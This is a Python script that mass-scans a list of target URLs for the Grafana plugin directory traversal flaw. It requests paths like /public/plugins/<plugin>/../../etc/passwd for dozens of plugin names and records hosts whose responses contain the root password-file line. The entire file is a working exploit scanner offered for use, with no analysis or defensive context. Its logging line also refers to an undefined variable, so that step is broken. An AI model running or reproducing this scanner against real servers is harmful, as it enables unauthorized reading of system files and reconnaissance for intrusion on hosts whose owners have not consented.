# -*- coding: utf-8 -*-
import ssl
import urllib.request

import requests, time, json
from urllib import request

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'
}

urls = open('url.txt')
for i in urls:
    url = i.rstrip("\n")
    list = ['/public/plugins/alertGroups/../../../../../../../../etc/passwd',
            '/public/plugins/alertlist/../../../../../../../../etc/passwd',
            '/public/plugins/alertmanager/../../../../../../../../etc/passwd',
            '/public/plugins/annolist/../../../../../../../../etc/passwd',
            '/public/plugins/barchart/../../../../../../../../etc/passwd',
            '/public/plugins/bargauge/../../../../../../../../etc/passwd',
            '/public/plugins/canvas/../../../../../../../../etc/passwd',
            '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
            '/public/plugins/dashboard/../../../../../../../../etc/passwd',
            '/public/plugins/dashlist/../../../../../../../../etc/passwd',
            '/public/plugins/debug/../../../../../../../../etc/passwd',
            '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
            '/public/plugins/gauge/../../../../../../../../etc/passwd',
            '/public/plugins/geomap/../../../../../../../../etc/passwd',
            '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
            '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
            '/public/plugins/grafana/../../../../../../../../etc/passwd',
            '/public/plugins/graph/../../../../../../../../etc/passwd',
            '/public/plugins/graphite/../../../../../../../../etc/passwd',
            '/public/plugins/heatmap/../../../../../../../../etc/passwd',
            '/public/plugins/histogram/../../../../../../../../etc/passwd',
            '/public/plugins/influxdb/../../../../../../../../etc/passwd',
            '/public/plugins/jaeger/../../../../../../../../etc/passwd',
            '/public/plugins/live/../../../../../../../../etc/passwd',
            '/public/plugins/logs/../../../../../../../../etc/passwd',
            '/public/plugins/loki/../../../../../../../../etc/passwd',
            '/public/plugins/mixed/../../../../../../../../etc/passwd',
            '/public/plugins/mssql/../../../../../../../../etc/passwd',
            '/public/plugins/mysql/../../../../../../../../etc/passwd',
            '/public/plugins/news/../../../../../../../../etc/passwd',
            '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
            '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
            '/public/plugins/piechart/../../../../../../../../etc/passwd',
            '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
            '/public/plugins/postgres/../../../../../../../../etc/passwd',
            '/public/plugins/prometheus/../../../../../../../../etc/passwd',
            '/public/plugins/stat/../../../../../../../../etc/passwd',
            '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
            '/public/plugins/status-history/../../../../../../../../etc/passwd',
            '/public/plugins/table-old/../../../../../../../../etc/passwd',
            '/public/plugins/table/../../../../../../../../etc/passwd',
            '/public/plugins/tempo/../../../../../../../../etc/passwd',
            '/public/plugins/testdata/../../../../../../../../etc/passwd',
            '/public/plugins/text/../../../../../../../../etc/passwd',
            '/public/plugins/timeseries/../../../../../../../../etc/passwd',
            '/public/plugins/welcome/../../../../../../../../etc/passwd',
            '/public/plugins/xychart/../../../../../../../../etc/passwd',
            '/public/plugins/zipkin/../../../../../../../../etc/passwd'
            ]

    for i in list:
        try:
            urls = url + i
            try:
                request = urllib.request.urlopen(urls, timeout=8)
                contnet = request.read().decode('utf-8')

            except:
                request = urllib.request.urlopen(urls, context=ssl.create_unverified_context())
                contnet = request.read().decode('utf-8')

            if 'root:x:0:0:root' in contnet:
                print("success  " + urls)
                with open("success.txt", "a+") as a:
                    a.write(result + '\n')
                    break
        except:
            pass


